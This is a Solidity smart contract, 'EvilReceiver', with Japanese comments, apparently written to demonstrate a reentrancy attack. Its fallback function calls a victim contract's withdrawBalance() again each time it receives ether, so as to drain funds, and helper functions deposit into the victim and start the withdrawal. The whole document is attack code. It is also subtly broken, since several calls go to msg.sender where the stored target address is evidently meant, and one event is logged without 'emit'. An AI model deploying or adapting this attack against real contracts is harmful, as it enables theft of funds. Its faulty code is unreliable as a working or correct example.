pragma solidity ^0.8.18;
contract EvilReceiver{
    //攻撃対象コントラクトのアドレス
    address public target;
    //メッセージ表示用のイベント
    event MessageLog(string);
    //残高表示用のイベント
    event BalanceLog(uint);
    
    ///コンストラクタ
    constructor (address _target){
        target = _target;
    }
    
    ///Fallback関数
    // function() payable {
    fallback() external payable{
        emit BalanceLog(address(this).balance);
        //VictimBalanceのwithdrawBalanceを呼び出し
        //次の処理が実行されると呼び出し元であるVictimBalanceのwithdrawBalance関数を呼び出します。
        
        (bool success, bytes memory data) = msg.sender.call{value:0}(bytes4(keccak256("withdrawBalance()")));
        // if(!msg.sender.call{value:0}(bytes4(sha3("withdrawBalance()")))){
         if(!success){
            MessageLog("FAIL");
        }
        else{
            MessageLog("SUCCESS");
        }
    }
    
    ///EOAからの送金時に利用する関数。予めこのコントラクト経由で攻撃する為に送金しとく。
    function addBalance()public payable{}
    
    ///攻撃対象への送金時に利用する関数
    //この処理が呼ばれると、攻撃者のEOAが保有している1etherではなく、EvilReceiverが保有している1etherが送金されます。
    function sendEthToTarget() public {
        (bool success, bytes memory data) = msg.sender.call{value:1 ether}(bytes4(keccak256("addToBalance()")));
        if(!success){
            revert();
        }
        // if(!target.call.value(1 ether)(bytes4(sha3("addToBalance()")))){revert();}
    }
    
    ///攻撃対象からの引き出し時に利用する関数
    function withdraw()public{
        (bool success, bytes memory data) = msg.sender.call{value:0}(bytes4(keccak256("withdrawBalance()")));
        if(!success){
            revert();
        }
         // if(!target.call{value:0}(bytes4(keccak256("withdrawBalance()")))){revert();}
    }
}